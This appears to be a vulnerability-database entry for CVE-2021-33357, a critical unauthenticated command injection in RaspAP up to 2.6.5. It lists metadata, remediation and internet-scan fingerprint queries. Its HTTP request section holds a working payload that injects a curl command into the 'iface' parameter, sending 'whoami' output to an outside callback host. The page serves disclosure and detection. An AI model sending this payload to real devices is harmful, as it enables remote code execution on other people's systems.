---
layout: post
cve_id: CVE-2021-33357
title: RaspAP <=2.6.5 - Remote Command Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-33357.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-33357.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu,pdteam
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized remote
  code execution, compromising the integrity and confidentiality of the affected system.

  '
remediation: 'Upgrade RaspAP to a version higher than 2.6.5 to mitigate the vulnerability.

  '
reference:
- https://checkmarx.com/blog/chained-raspap-vulnerabilities-grant-root-level-access/
- https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf
- https://github.com/RaspAP/raspap-webgui
- https://nvd.nist.gov/vuln/detail/CVE-2021-33357
- https://github.com/20142995/Goby
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-33357
  cwe-id: CWE-78
  epss-score: 0.94007
  epss-percentile: 0.99885
  cpe: cpe:2.3:a:raspap:raspap:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: raspap
  product: raspap
  shodan-query: http.favicon.hash:-1465760059
  fofa-query: icon_hash=-1465760059
tags:
- cve2021
- cve
- rce
- raspap
- oast
- vkev
- vuln
---

## ðŸ” Vulnerability Description
RaspAP 2.6 to 2.6.5 allows unauthenticated attackers to execute arbitrary OS commands via the "iface" GET parameter in /ajax/networking/get_netcfg.php, when the "iface" parameter value contains special characters such as ";".


## ðŸŒ HTTP Request
```nohighlight
GET /ajax/networking/get_netcfg.php?iface=;curl%20d5iual9le0o3l90aupkge5g5zfo7i1rzo.oast.me/`whoami`; HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.5
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

